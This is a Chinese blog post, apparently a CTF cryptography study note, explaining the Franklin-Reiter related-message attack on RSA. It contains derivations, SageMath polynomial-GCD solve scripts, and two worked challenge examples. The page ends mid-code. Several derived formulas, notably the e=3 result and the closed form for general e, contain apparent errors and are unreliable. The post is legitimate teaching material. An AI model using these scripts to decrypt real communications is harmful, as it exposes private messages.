从特殊到一般情况研究，给出了一下三种情况，论文中使用：使用$k$，表示消息$m_i$的个数；使用$e$表示RSA加密的公钥$e$；使用$p$表示消息直接满足的多项式，以及使用$\delta$表示该多项式的次数。</p><ul><li><p>先从$k=2,e=3,\delta=1$这种情况来考虑：</p><ul><li>其实也就是两个消息$m_1,m_2$，满足一个一次多项式关系$m_1=p(m_2)=am_2+b$</li><li>并且已知下面式子中的$c_1,c_2,n,e$，以及多项式$p$的系数和常数项</li></ul><p>$$<br>c_1\equiv m_1^{e}~mod(~n)\c_2\equiv m_2^{e}~mod(~n)<br>$$</p><ul><li>已知上述情况可以推导出使用$f(x)=x^{e}-c_1~mod(~n)$与$f(p(x))=(ax+b)^{e}-c_2~mod(~n)$有最大公因式$x-m_1$，从而使用求最大公因式的方法可以求出$m_1$</li><li>之后进一步探究了<code>e</code>的一般情况，得出结论：使用更高效的<code>求最大公因式</code>方法，可以使得对于$e$在<code>32bit</code>大小的情况下这个攻击也是能实现的。</li></ul></li><li><p>再从$k=2,e\in Z_+,\delta\in Z_+$这种情况研究：</p><ul><li>也就是两个消息$m_1,m_2$，满足一个$\delta$次的多项式关系$m_2=p(m_1)=c_{\delta}m_1^{\delta}+c_{\delta-1}m_1^{\delta-1}+…+c_0$</li><li>并且已知下面式子中的$c_1,c_2,n,e$，以及多项式$p$的系数和常数项</li></ul><p>$$<br>c_1=m_1^{e}~mod(~n)\<br>c_2=m_2^{e}~mod(~n)<br>$$</p><ul><li>已知上述情况可以推导出一般情况$g(x)=gcd(f(x),f(p(x)))$，则$(x-m_1)|g(x)$，特殊情况下$g(x)=x-m_1$，还存在无解的情况，也就是当$p(x)=x^{h}q(x^{e})$，此时$c_1=c_2^{h}(q(c_1))^{e}$</li></ul></li><li><p>之后继续讨论了$k=2,e\in Z_+,\delta\in Z_+$这种情况，此时多项式并不是类似于上一个显式的多项式，而是隐式多项式。</p><ul><li>也就是两个消息$m_1,m_2$，满足一个的$\delta$次的多项式关系$p(m_1,m_2)=0~mod(~n)$，例如：$p(m1,m2)=am_1^{2}+bm_2^{2}$这样的隐函数。</li><li>并且已知下面式子中的$c_1,c_2,n,e$，以及多项式$p$的系数和常数项</li></ul><p>$$<br>P_1=p(m_1,m_2)=0~mod(~n)\<br>P_2=m_1^{e}-c_1=0~mod(~n)\<br>P_3=m_2^{e}-c_2=0~mod(~n)<br>$$</p><ul><li>这个时候论文为了讨论算法的复杂度，就使用了<code>结式</code>和<code>最大公因式</code>的方法求解（具体求解方法我也没懂）。</li><li>在讨论这种情况的最后论文作者还点名了<code>结式</code>和<code>最大公因式</code>的方法都可以归入<code>Gröbner基</code>这一通用框架中。</li></ul></li><li><p>论文最后讨论$k\in Z_+,e\in Z_+,\delta\in Z_+$这一情况：</p><ul><li>也就是已知$k$个消息$m_1,m_2,…,m_k$，满足一个$\delta$次的隐式多项式$p(m_1,m_2,…,m_k)$</li><li>并且已知下面式子中的$c_1,c_2,…,c_i,n,e$，以及多项式$p$的系数和常数项</li></ul><p>$$<br>\begin{array}{l}<br>P_0(x_1,…,x_k)=p(x_1,…,x_k)=0~mod(~n)\<br>P_1(x_1)=x_1^e-c_1=0~mod(~n)\<br>P_2(x_2)=x_2^{e}-c_2=0~mod(~n)\<br>…\<br>P_i(x_i)=x_i^{e}-c_i=0~mod(~n)\<br>…\<br>P_k(x_k)=x_k^{e}-c_k=0~mod(~n)<br>\end{array}<br>$$</p><ul><li>这个时候直接使用<code>Gröbner基</code>一把梭，或者使用<code>结式</code>与<code>gcd</code>结合求解即可。</li></ul></li></ul><p><strong>通过阅读另一篇论文</strong>，也就是这篇论文   <a href="https://www.iacr.org/archive/pkc2005/33860001/33860001.pdf">33860001.pdf</a>   会发现一个另一种情形下的相关消息攻击。</p><ul><li><p>该论文讨论的是另一种线性相关消息的攻击，即$k\in Z_+,e\in Z_+,\delta=1$这种情况。</p><ul><li>此时我们并不知道原消息$m$，通过RSA加密后$c=m^e~mod(n)$，的密文。但是我们知道$e$个线性相关的消息$m_i=a_im+b_i,i=0,1,…,e-1$，$c_i=m_i^e~mod(~n)$，以及线性相关多项式的系数$a_i、b_i$。</li><li>所以列出式子就有如下：</li></ul><p>$$<br>m_i=p_i(m)=a_im+b_i\<br>c_i=m_i^e~mod(~n)<br>$$</p><ul><li>这种情况使用线性代数的方法是可以求解的，但是从算法的角度上来看效率可能会更低，所以仍然要另辟蹊径。</li></ul></li></ul><p><strong>疑问</strong>：这里其实我还是有个疑问，为什么<code>Franklin-Reiter攻击</code>在<code>CTF Wiki</code>中会被放在<code>Coppersmith相关攻击</code>这篇文章内容里面呢？（先不管这个问题，接下去看看）</p><h1 id="两个消息线性关系">两个消息线性关系</h1><ul><li><p>该部分研究的就是第一个论文的第一种情况，即$k=2,\delta=1$而$e\in Z+$这一情况。</p></li><li><p>接下来根据已知的数学条件，就需要来进行推导与分析了。下面先列出一些列的已知条件：</p></li><li><p>首先就是<code>RSA</code>加密，可以得到如下这个条件：</p></li></ul><p>$$<br>c_1\equiv m_1^{e}~mod~(n)\<br>c_2\equiv m_2^{e}~mod~(n)<br>$$</p><ul><li>其次两个被加密的消息满足线性关系，则有如下条件，其中<code>a</code>、<code>b</code>是已知的：</li></ul><p>$$<br>\begin{array}{l}<br>m_1 = am_2+b\<br>m_1 \equiv am_2+b~mod~(n)<br>\end{array}<br>$$</p><h2 id="e为3的情况">e为3的情况</h2><ul><li>对于一般的情况现在我们还不清楚，先采用<strong>解剖麻雀</strong>的方法，取一个<code>e=3</code>的情况对这个条件进行研究看看。先将题目已知列出来，从该攻击针对的情况，可以得到这三个基础的式子，其中<code>c1、c2、a、b</code>是已知的，三个方程两个未知数，一般都是可以解出方程的：</li></ul><p>$$<br>\begin{array}{l}<br>c_1 \equiv m_1^{3}~mod~(n)\<br>c_2 \equiv m_2^{3}~mod~(n)\<br>m_1 = a*m_2+b<br>\end{array}<br>$$</p><ul><li><p>那么接下来就来推导一下这个式子，推导式子的过程中有比较灵活的<code>代换</code>以及<code>因式分解</code>，但是要记住一点代换的目的就是为了降幂，与解方程一样：</p><ul><li>首先由$c_1\equiv m_1^{3}~mod~(n)$，可以得到：</li></ul><p>$$<br>\begin{align*}<br>c_1&amp;\equiv (a<em>m_2+b)^{3}\<br>&amp;\equiv (am_2)^{3}+3(am_2)^{2}b+3(am_2)b^{2}+b^{3}\<br>&amp;\equiv (am_2)^{3}-2b^{3}+3b[(am_2)^{2}+(am_2)b+b^{2}]~mod~(n)~~~~~~~~~(1)<br>\end{align</em>}<br>$$</p><ul><li>其次由$c_2\equiv m_2^{3}~mod~(n)$，两边先同时乘上$a^{3}$，再同时减去$b^{3}$可以得到：</li></ul><p>$$<br>a^{3}c_2-b^{3}\equiv (am_2)^{3}-b^{3}\equiv (am_2-b)*[(am_2)^2+am_2b+b^2]~~~~~~~~~(2)<br>$$</p><ul><li>使用<code>(1)式-(2)式</code>可以得到一个<code>(3)</code>式：</li></ul><p>$$<br>\begin{align*}<br>c_1-a^{3}c_2+b^{3}&amp;\equiv (am_2)^{3}-2b^{3}+3b[(am_2)^{2}+(am_2)b+b^{2}]-(am_2-b)<em>[(am_2)^2+am_2b+b^2]\<br>&amp;\equiv (am_2)^{3}-b^{3} -(am_2-b)</em>[(am_2)^2+am_2b+b^2]+ 3b[(am_2)^{2}+(am_2)b+b^{2}] - b^{3}\<br>&amp;\equiv  3b[(am_2)^{2}+(am_2)b+b^{2}] - b^{3}~mod~(n)<br>\end{align*}<br>$$</p><p>$$<br>\Rightarrow c_1-a^{3}c_2+2b^{3}\equiv3b[(am_2)^{2}+(am_2)b+b^{2}]~mod~(n)~~~~~~~(3)<br>$$</p><ul><li>这个时候就要回到<code>(2)</code>式，代换立方差的那一部分公式$[(am_2)^{2}+(am_2)b+b^{2}]$，这样就可以得到：</li></ul><p>$$<br>c_1-a^{3}c_2+2b^{3}\equiv3b\frac{a^{3}c_2-b^{3}}{am_2-b}~mod~(n)<br>$$</p><ul><li>最后将$(am_2-b)$移动到左边：</li></ul><p>$$<br>(am_2-b)\equiv3b\frac{a^{3}c_2-b^{3}}{c_1-a^{3}c_2+2b^{3}}~mod~(n)<br>$$</p><ul><li>最终就得到：</li></ul><p>$$<br>m_2\equiv3b\frac{a^{3}c_2-b^{3}}{a*(c_1-a^{3}c_2+2b^{3})}+\frac{b}{a}=\frac{b}{a}(\frac{c_1+2a^{3}c_2-b^{3}}{c_1-a^{3}c_2+2b^{2}})~mod~(n)<br>$$</p></li></ul><h2 id="e为任意的情况">e为任意的情况</h2><ul><li>按照上面的推导方法，最终可以得到一般情况：</li></ul><p>$$<br>m_2 = e*\frac{b}{a}(\frac{a^{e}c_2-b^{e}}{c_1-a^{e}c_2+(e-1)b^{e}}+1)~mod(~n)<br>$$</p><ul><li><p>现在其实我们可以明确的一点是，如果两个相同的公钥<code>e</code>加密两个明文<code>m1,m2</code>，得到<code>c1,c2</code>，这两个明文其中可以先解出<code>m2</code>，然后根据线性关系，其实还可以解出<code>m1</code>。那这就相当于明文可以被破解了，这种其实属于<strong>代数可解</strong>。</p></li><li><p>既然该式子是<strong>代数可解</strong>，那么为什么不使用公式法直接求<code>m2</code>呢？是因为这样套公式计算确实比较复杂，当<code>e</code>很大的时候可能精度会损失，以及计算效率低。</p></li></ul><h2 id="另辟蹊径之求最大公因式">另辟蹊径之求最大公因式</h2><h3 id="推导">推导</h3><p>此时其实就需要另辟蹊径了。通过研究这个式子就会发现:</p><ul><li><p>多项式$f(x)=x^{e}-c_1~mod(~n)=0$的一个解为$x=m_2$，所以该多项式可以因式分解成$f(x)=(x-m_2)g_1(x)$</p></li><li><p>而另一个多项式$f(p(x))=(ax+b)^{e}~mod(~n)=0$的一个解也为$x=m_2$，所以该多项式可以因式分解成$f(p(x))=(x-m_2)g_2(x)$</p></li><li><p>所以$gcd(f(x),f(p(x)))=(x-m_2)$，此时就将使用公式求解转换成求两个多项式的最大公因式，这样可以避免除法并且可以提高计算效率。</p></li></ul><p>对于编写求解最大公因式的算法，其实用Sagemath是最方便的，所以这里就直接使用Sagemath求解最大公因式。这里给出几个<code>SageMath</code>求解最大公因式的几个代码。以及加快求解最大公因式的方法<code>Half-gcd</code>的代码以及算法推导公式。</p><h3 id="代码1普通多项式gcd">代码1——普通多项式gcd</h3><ul><li>代码一，使用<code>Sagemath</code>编写多项式<code>gcd</code>算法：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=</span><br><span class="line">a=</span><br><span class="line">c1=</span><br><span class="line">c2=</span><br><span class="line">e = </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Franklin</span>(<span class="params">n,e,a,b,c1,c2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    n: 模数</span></span><br><span class="line"><span class="string">    e: 指数</span></span><br><span class="line"><span class="string">    a: 线性关系中am+b中的a</span></span><br><span class="line"><span class="string">    b: 线性关系中am+b中的b</span></span><br><span class="line"><span class="string">    c1: f = x^e - c1 中的c1,也就是没有被线性变换过的加密密文</span></span><br><span class="line"><span class="string">    c2: 线性变换过的加密密文</span></span><br><span class="line"><span class="string">    return value: int-&gt;m</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> </span><br><span class="line">    <span class="comment"># 首先要设置一个环中的变量,用这个变量来表示多项式</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n)) <span class="comment"># 创建一个模n下的多项式环,环的名称为PR,该环的变量为x</span></span><br><span class="line">    f = x^e - c1 </span><br><span class="line">    g = (a*x+b)^e - c2</span><br><span class="line">    <span class="keyword">while</span> f:</span><br><span class="line">        g,f = f,g % f</span><br><span class="line">    g = g.monic() <span class="comment"># 将g转换为首一多项式,也就是该多项式次数最高次这一项系数为1的多项式</span></span><br><span class="line">    m = g.constant_coefficient()</span><br><span class="line">    <span class="keyword">if</span> m &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(n-m)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line">m = Franklin(n,e,a,b,c1,c2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="代码2多项式half-gcd">代码2——多项式Half-gcd</h3><ul><li>代码二，使用<code>Sagemath</code>和<code>python</code>编写<code>Half-gcd</code>算法，这边也顺便贴一下参考资料与参考论文。</li><li>参考论文：<a href="https://www.researchgate.net/publication/221564865_Half-GCD_and_fast_rational_recovery">(PDF) Half-GCD and fast rational recovery</a></li><li>参考博客：<a href="https://www.cnblogs.com/whx1003/p/16217087.html">多项式 gcd 的正确姿势：Half-GCD 算法 - whx1003 - 博客园</a></li></ul><blockquote><p>进入正题：</p></blockquote><h3 id="代码3sagemath一把梭">代码3——Sagemath一把梭</h3><ul><li>代码三，使用<code>sagemath</code>其实没有快速计算<code>gcd</code>的方法，但是<code>sagemath</code>中有内置的<code>PARI/GP </code>库（也是一个常用于数学的编程语言），所以可以将Sagemath中的<code>PolynomialRing()</code>这个多项式先转换为<code>PARI/GP</code>内置多项式类型。</li><li>之后再使用<code>PARI/GP</code>内置的<code>gcd</code>快速求解两个多项式的最大公因式，而<code>PARI/GP</code>内置的快速求解两个多项式的最大公因式的方法其实就是使用的<code>Half-gcd</code>。代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n)) <span class="comment"># 创建一个模n下的多项式环,环的名称为PR,该环的变量为x</span></span><br><span class="line">f =</span><br><span class="line">g = </span><br><span class="line"><span class="comment"># 下面是关键一步,记为(*)</span></span><br><span class="line">G = PR(f._pari_with_name(<span class="string">&#x27;x&#x27;</span>).gcd(g._pari_with_name(<span class="string">&#x27;x&#x27;</span>))) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤(*),其实拆开来就是如下代码</span></span><br><span class="line">f_pari = f._pari_with_name(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">g_pari = g._pari_with_name(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">G = f_pari.gcd(g_pari)</span><br></pre></td></tr></table></figure><ul><li>完整代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = </span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">e = </span><br><span class="line"><span class="comment"># 首先要设置一个环中的变量,用这个变量来表示多项式</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Franklin</span>(<span class="params">n,e,a,b,c1,c2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    n: 模数</span></span><br><span class="line"><span class="string">    e: 指数</span></span><br><span class="line"><span class="string">    a: 线性关系中am+b中的a</span></span><br><span class="line"><span class="string">    b: 线性关系中am+b中的b</span></span><br><span class="line"><span class="string">    c1: f = x^e - c1 中的c1,也就是没有被线性变换过的加密密文</span></span><br><span class="line"><span class="string">    c2: 线性变换过的加密密文</span></span><br><span class="line"><span class="string">    return value: int-&gt;m</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> </span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n)) <span class="comment"># 创建一个模n下的多项式环,环的名称为PR,该环的变量为x</span></span><br><span class="line">    f = x^e - c1 </span><br><span class="line">    g = (a*x+b)^e - c2</span><br><span class="line">    G = PR(f._pari_with_name(<span class="string">&#x27;x&#x27;</span>).gcd(g._pari_with_name(<span class="string">&#x27;x&#x27;</span>))) <span class="comment"># PR()将求得的公因式转换到PR环上</span></span><br><span class="line">    <span class="built_in">print</span>(G)</span><br><span class="line">    G = G.monic()</span><br><span class="line">    <span class="built_in">print</span>(G)</span><br><span class="line">    m = G.constant_coefficient()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line">        </span><br><span class="line">m = Franklin(n,e,a,b,c1,c2)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="built_in">print</span>(n-m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(n-m)))</span><br></pre></td></tr></table></figure><h2 id="例题">例题</h2><h3 id="例题1">例题1</h3><ul><li><p>题目来源：<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/130978226">Franklin-Reiter相关消息攻击-CSDN博客</a></p></li><li><p>题目附件如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">N = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, N)</span><br><span class="line"></span><br><span class="line">a = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">b = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">m2 = a * m1 + b</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(N, a, b, c1, c2, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=51296885372346449295388453471330409021784141081351581975478435681552082076338697136130122011636685327781785488670769096434920591920054441921039812310126089859349902066456998315283909435249794317277620588552441456327265553018986591779396701680997794937951231970194353001576159809798153970829987274504038146741</span></span><br><span class="line"><span class="string"> a=13256631249970000274738888132534852767685499642889351632072622194777502848070957827974250425805779856662241409663031192870528911932663995606616763982320967</span></span><br><span class="line"><span class="string"> b=12614470377409090738391280373352373943201882741276992121990944593827605866548572392808272414120477304486154096358852845785437999246453926812759725932442170</span></span><br><span class="line"><span class="string"> c1=18617698095122597355752178584860764221736156139844401400942959000560180868595058572264330257490645079792321778926462300410653970722619332098601515399526245808718518153518824404167374361098424325296872587362792839831578589407441739040578339310283844080111189381106274103089079702496168766831316853664552253142</span></span><br><span class="line"><span class="string"> c2=14091361528414093900688440242152327115109256507133728799758289918462970724109343410464537203689727409590796472177295835710571700501895484300979622506298961999001641059179449655629481072402234965831697915939034769804437452528921599125823412464950939837343822566667533463393026895985173157447434429906021792720</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>此题是一个比较典型的<strong>相关消息攻击</strong>，通过题目附件的代码有如下已知条件：<br>$$<br>\begin{array}{l}<br>m_2=am_1+b\<br>c_1=m_1^{17}~mod(~n)\<br>c_2=m_2^{17}~mod(~n)<br>\end{array}<br>$$<br>由$m_1、m_2$的线性关系可以带入$c_2=m_2^{17}~mod(~n)$就可以得到如下式子：<br>$$<br>c_2=(am_1+b)^{17}~mod(~n)<br>$$<br>由前面的另辟蹊径就能知道，多项式$f(x)=x^{17}-c_1~mod(~n)$与多项式$g(x)=(ax+b)^{17}-c_2~mod(~n)$有公因式$(x-m_1)$。</p><p>从而将问题转变为求解这两个多项式的最大公因式，即可得到原来的明文$m_1$，思路已经有了，现在直接编写exp即可。</p></blockquote><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">51296885372346449295388453471330409021784141081351581975478435681552082076338697136130122011636685327781785488670769096434920591920054441921039812310126089859349902066456998315283909435249794317277620588552441456327265553018986591779396701680997794937951231970194353001576159809798153970829987274504038146741</span></span><br><span class="line">a=<span class="number">13256631249970000274738888132534852767685499642889351632072622194777502848070957827974250425805779856662241409663031192870528911932663995606616763982320967</span></span><br><span class="line">b=<span class="number">12614470377409090738391280373352373943201882741276992121990944593827605866548572392808272414120477304486154096358852845785437999246453926812759725932442170</span></span><br><span class="line">c1=<span class="number">18617698095122597355752178584860764221736156139844401400942959000560180868595058572264330257490645079792321778926462300410653970722619332098601515399526245808718518153518824404167374361098424325296872587362792839831578589407441739040578339310283844080111189381106274103089079702496168766831316853664552253142</span></span><br><span class="line">c2=<span class="number">14091361528414093900688440242152327115109256507133728799758289918462970724109343410464537203689727409590796472177295835710571700501895484300979622506298961999001641059179449655629481072402234965831697915939034769804437452528921599125823412464950939837343822566667533463393026895985173157447434429906021792720</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"><span class="comment"># 首先要设置一个环中的变量,用这个变量来表示多项式</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n)) <span class="comment"># 创建一个模n下的多项式环,环的名称为PR,该环的变量为x</span></span><br><span class="line">f = x^e - c1 </span><br><span class="line">g = (a*x+b)^e - c2</span><br><span class="line"><span class="keyword">while</span> f:</span><br><span class="line">    g,f = f,g % f   <span class="comment"># 使用辗转相除法求得多项式最大公因式</span></span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">g = g.monic() <span class="comment"># 将g转换为首一多项式,也就是该多项式次数最高次这一项系数为1的多项式</span></span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line"><span class="comment"># 提取该多项式的常数项,但是发现常数项不是负数,所以该数其实并不是真正的m,而n-m才是真正的m</span></span><br><span class="line">m = g.constant_coefficient() </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(n-m)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;a593591a-3749-cc52-0c27-e897fac2c967&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="例题2">例题2</h3><ul><li><p>接下来稍微修改一下例题1，将<code>e=17</code>，替换成<code>e=65537</code></p></li><li><p>题目附件如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()).encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">N = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, N)</span><br><span class="line"></span><br><span class="line">a = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">b = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">m2 = a * m1 + b</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a =&quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b =&quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 59861917324226967486215648256894012851495145204497486380891167740615801374063455379673715500954583547144532511038617630076588124328491649811856993314542460125128961468483743038573111414419166480096592264420724034747983484148465064161457578180902917692815465155951262833991421445819783698766048087026362827177</span></span><br><span class="line"><span class="string">a = 8912027245219554871633263198357534861260151492942640613543674312789184411070375687173938678863885846785442731416745232377239461392819384805757821014008997</span></span><br><span class="line"><span class="string">b = 9082019118159490199184118787363903212978739183503144824083405972098784434747374470051472810662991934944899511831981983317873229914591770162089271570548898</span></span><br><span class="line"><span class="string">c1 = 13829716726154552626808370709385622815070337340315816233387666503855034657492722518838631908542319087651252784674601561198457938726403898164944489259977862308799162509306623034533701622307267177872660177001435552253633489217686479650060107252554076305263872524702049994229524235844714514276932861812294412208</span></span><br><span class="line"><span class="string">c2 = 12344340068962283228603202053643543482434797000939385457621435796626275462396259806353278281512262932359248462422732215649437185890052207218476381335849291479672021635844167181113351805907880675672544417067152443404516325590447421944842581421615420605120177863329347579906535387550917852112995890140027254347</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>思路大致是和例题1一样的，但是这题如果使用例题1的exp需要跑很久的。原因：<strong>e太大了，导致多项式次数和系数的比较大，使得计算所花费的时间和算力都非常多</strong></p><p>此时就需要对辗转相除法进行算法上的优化，所以引入了一个新的辗转相除法，也就是<code>Half-gcd</code>算法。下面主要讲解的就是这个算法的具体过程以及算法实现的具体代码。</p><p>这里就贴一个<code>Half-gcd</code>的论文，<code>Half-gcd</code>的详细过程放在代码2那边讲解，那边也贴个论文：<a href="https://www.researchgate.net/publication/221564865_Half-GCD_and_fast_rational_recovery">(PDF) Half-GCD and fast rational recovery</a></p></blockquote><ul><li>这里给出一个<code>Sagemath</code>自带的快速计算两个多项式最大公因式的方法：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f._pari_with_name(<span class="string">&#x27;x&#x27;</span>).gcd(g._pari_with_name(<span class="string">&#x27;x&#x27;</span>))</span><br></pre></td></tr></table></figure><ul><li>完整的exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 